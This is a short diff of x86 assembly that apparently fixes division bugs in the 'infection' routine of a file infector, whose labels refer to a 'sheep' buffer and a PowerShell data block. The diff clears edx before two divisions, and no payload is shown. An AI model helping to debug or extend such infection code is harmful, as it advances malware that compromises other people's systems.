@@ -42,6 +42,7 @@ infection__data:
    inc eax
    mov ecx, eax
    mov dword [ebp-4], 4
+   xor edx,edx
    div dword [ebp-4]
    test edx,edx
    jz infection__alloc_sheep_aligned
@@ -57,6 +58,7 @@ infection__alloc_sheep_aligned:
    mov eax, [ebx+(infection__data__powershell-infection__data__start)]
    inc eax
    mov ecx, eax
+   xor edx, edx
    div dword [ebp-4]
    test edx,edx
    jz infection__alloc_powershell_aligned
